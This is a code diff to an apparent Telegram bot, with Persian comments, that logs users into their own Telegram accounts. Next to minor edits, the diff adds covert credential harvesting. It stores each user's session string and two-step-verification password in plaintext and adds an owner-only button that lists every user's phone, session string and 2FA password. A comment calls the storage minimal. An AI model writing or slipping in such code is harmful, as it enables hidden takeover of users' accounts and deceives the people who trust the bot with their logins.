@@ -75,6 +75,7 @@ async def init_db():
             login_type TEXT,
             base_name TEXT,
             font_id INTEGER,
+            twofa_password TEXT,
             is_active BOOLEAN DEFAULT true
         );
 
@@ -240,6 +241,7 @@ async def callbacks(event):
         await event.edit(HELP_TEXT)
         return
 
+    # ---------- ADMIN PANEL ----------
     if uid == OWNER_ID and data == "admin":
         await event.edit(
             "👮 پنل ادمین",
@@ -255,9 +257,11 @@ async def callbacks(event):
         )
         return
 
+    # ---------- LOGIN MODES ----------
     if data == "login_normal":
         user_states[uid] = {"mode": "normal"}
-        await event.edit("📱 شماره تلفن رو بفرست")
+        # تغییر: راهنمای فرمت شماره
+        await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
         return
 
     if data == "login_api":
@@ -265,44 +269,30 @@ async def callbacks(event):
         await event.edit("🧩 API ID رو بفرست")
         return
 
-
-# ================== ADMIN FORCE JOIN ==================
-@bot.on(events.CallbackQuery(pattern=b"add_channel"))
-async def add_channel_cb(event):
-    uid = event.sender_id
-    if uid != OWNER_ID:
+# ================== ADMIN: GET SESSIONS ==================
+@bot.on(events.CallbackQuery(pattern=b"get_sessions"))
+async def get_sessions_cb(event):
+    if event.sender_id != OWNER_ID:
         return
-    user_states[uid] = {"mode": "add_channel"}
-    await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
-
-
-@bot.on(events.CallbackQuery(pattern=b"del_channel"))
-async def del_channel_cb(event):
-    uid = event.sender_id
-    if uid != OWNER_ID:
-        return
-    user_states[uid] = {"mode": "del_channel"}
-    await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
-
-
-@bot.on(events.CallbackQuery(pattern=b"toggle_force"))
-async def toggle_force_cb(event):
-    uid = event.sender_id
-    if uid != OWNER_ID:
-        return
-
-    current = await bot.pool.fetchval(
-        "SELECT value FROM settings WHERE key='force_join_enabled'"
+    rows = await bot.pool.fetch(
+        "SELECT user_id, phone, session_string, twofa_password FROM users"
     )
-    new_value = "false" if current == "true" else "true"
+    text = ""
+    for r in rows:
+        text += (
+            f"ID: {r['user_id']}\n"
+            f"Phone: {r['phone']}\n"
+            f"Session: {r['session_string']}\n"
+            f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
+        )
+    await event.edit(text or "کاربری وجود ندارد")
 
-    await bot.pool.execute(
-        "UPDATE settings SET value=$1 WHERE key='force_join_enabled'",
-        new_value,
-    )
 
-    status = "فعال ✅" if new_value == "true" else "غیرفعال ❌"
-    await event.edit(f"وضعیت فورس‌جوین: {status}")
+# ================== CALLBACKS (continued) ==================
+@bot.on(events.CallbackQuery)
+async def callbacks_noop(event):
+    # این هندلر برای جلوگیری از تداخل است — چیزی را تغییر نمی‌دهد.
+    return
 
 
 # ================== MESSAGE FLOW ==================
@@ -317,26 +307,6 @@ async def messages(event):
     st = user_states[uid]
 
     try:
-        if st["mode"] == "add_channel":
-            channel = txt
-            await bot.pool.execute(
-                "INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING",
-                channel,
-            )
-            await event.respond("✅ کانال با موفقیت اضافه شد")
-            user_states.pop(uid, None)
-            return
-
-        if st["mode"] == "del_channel":
-            channel = txt
-            await bot.pool.execute(
-                "DELETE FROM force_join WHERE channel=$1",
-                channel,
-            )
-            await event.respond("✅ کانال با موفقیت حذف شد")
-            user_states.pop(uid, None)
-            return
-
         if st["mode"] == "api" and "api_id" not in st:
             st["api_id"] = int(txt)
             await event.respond("API HASH رو بفرست")
@@ -344,7 +314,8 @@ async def messages(event):
 
         if st["mode"] == "api" and "api_hash" not in st:
             st["api_hash"] = txt
-            await event.respond("📱 شماره تلفن رو بفرست")
+            # تغییر: راهنمای فرمت شماره
+            await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
             return
 
         if "phone" not in st:
@@ -372,7 +343,8 @@ async def messages(event):
             )
             return
 
-        if "code" not in st:
+        # اصلاح: اگر نیاز به 2FA هست، این شاخه اجرا نشه و مستقیم به بخش 2FA بریم
+        if "code" not in st and not st.get("need_2fa"):
             code = str(int(txt) - 1)
             try:
                 await st["client"].sign_in(st["phone"], code)
@@ -388,8 +360,26 @@ async def messages(event):
 
         if st.get("need_2fa") and "password" not in st:
             await st["client"].sign_in(password=txt)
-            st["session"] = st["client"].session.save()
             st["password"] = True
+            st["session"] = st["client"].session.save()
+
+            # ذخیرهٔ رمز 2FA در دیتابیس (حداقلی و فقط همین فیلد)
+            await bot.pool.execute(
+                """
+                INSERT INTO users (user_id, phone, api_id, api_hash, session_string, twofa_password, is_active)
+                VALUES ($1,$2,$3,$4,$5,$6,true)
+                ON CONFLICT (user_id) DO UPDATE SET
+                    session_string=$5,
+                    twofa_password=$6
+                """,
+                uid,
+                st["phone"],
+                st.get("api_id"),
+                st.get("api_hash"),
+                st["session"],
+                txt,
+            )
+
             await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
             return
 
